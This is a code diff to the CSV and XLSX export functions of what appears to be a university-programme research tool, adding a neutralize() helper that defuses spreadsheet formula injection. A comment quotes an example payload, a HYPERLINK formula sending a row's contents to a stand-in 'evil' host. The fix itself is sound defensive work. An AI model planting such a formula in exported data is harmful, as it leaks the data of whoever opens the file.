@@ -17,6 +17,39 @@ from typing import Any
 
 from app.schemas.result import ProgramResult
 
+#: Characters a spreadsheet reads as the start of a formula rather than as
+#: text. Excel, LibreOffice and Sheets all do this, and two of the values in a
+#: row are outside our control: the applicant's own notes, and text lifted from
+#: a third-party page by the crawler. `=HYPERLINK("http://evil/?"&A1,"open")`
+#: in a note is a working exfiltration of the row it sits in, the moment
+#: somebody opens the file they exported.
+_FORMULA_LEAD = ("=", "+", "-", "@", "\t", "\r")
+
+
+def _is_number(value: str) -> bool:
+    try:
+        float(value)
+    except ValueError:
+        return False
+    return True
+
+
+def neutralize(value: object) -> object:
+    """Make a cell inert without changing what a reader sees it say.
+
+    A leading apostrophe is the spreadsheet convention for "this is text": it
+    is consumed on load and does not appear in the cell. Numbers, dates and
+    booleans are handed through untouched — only a string can be a formula —
+    and so is a bare negative number, which would otherwise stop being a
+    number the moment it was quoted.
+    """
+    if not isinstance(value, str) or not value.startswith(_FORMULA_LEAD):
+        return value
+    if _is_number(value):
+        return value
+    return "'" + value
+
+
 COLUMNS: list[tuple[str, str]] = [
     ("university", "University"),
     ("country", "Country"),
@@ -180,7 +213,7 @@ def to_csv(results: list[ProgramResult]) -> str:
     writer.writerow([label for _, label in COLUMNS])
     for r in results:
         row = _row(r)
-        writer.writerow([row[key] for key, _ in COLUMNS])
+        writer.writerow([neutralize(row[key]) for key, _ in COLUMNS])
     return buf.getvalue()
 
 
@@ -233,7 +266,7 @@ def to_xlsx(results: list[ProgramResult], meta: dict | None = None) -> bytes:
     }
     for r in results:
         row = _row(r)
-        ws.append([row[key] for key, _ in COLUMNS])
+        ws.append([neutralize(row[key]) for key, _ in COLUMNS])
         idx = ws.max_row
         fill = status_fills.get(row["funding_classification"])
         if fill:
@@ -274,15 +307,15 @@ def to_xlsx(results: list[ProgramResult], meta: dict | None = None) -> bytes:
         for claim in r.claims:
             cs.append(
                 [
-                    r.university,
-                    r.program,
+                    neutralize(r.university),
+                    neutralize(r.program),
                     claim.claim_type.value,
-                    str(claim.normalized_value)[:200],
+                    neutralize(str(claim.normalized_value)[:200]),
                     claim.status.value,
                     claim.source_specificity.value,
                     claim.accessed_at.isoformat(),
-                    claim.source_url,
-                    claim.original_text_excerpt[:400],
+                    neutralize(claim.source_url),
+                    neutralize(claim.original_text_excerpt[:400]),
                 ]
             )
     for col, width in zip("ABCDEFGHI", (28, 30, 26, 30, 22, 22, 26, 52, 70), strict=False):
@@ -297,22 +330,22 @@ def to_xlsx(results: list[ProgramResult], meta: dict | None = None) -> bytes:
         for conflict in r.conflicts:
             qs.append(
                 [
-                    r.university,
-                    r.program,
+                    neutralize(r.university),
+                    neutralize(r.program),
                     "source conflict",
-                    conflict.subject,
-                    f"Values seen: {conflict.values}",
+                    neutralize(conflict.subject),
+                    neutralize(f"Values seen: {conflict.values}"),
                     "yes",
                 ]
             )
         for q in r.unresolved:
             qs.append(
                 [
-                    r.university,
-                    r.program,
-                    q.topic,
-                    q.question,
-                    q.why_it_matters,
+                    neutralize(r.university),
+                    neutralize(r.program),
+                    neutralize(q.topic),
+                    neutralize(q.question),
+                    neutralize(q.why_it_matters),
                     "yes" if q.blocking else "no",
                 ]
             )
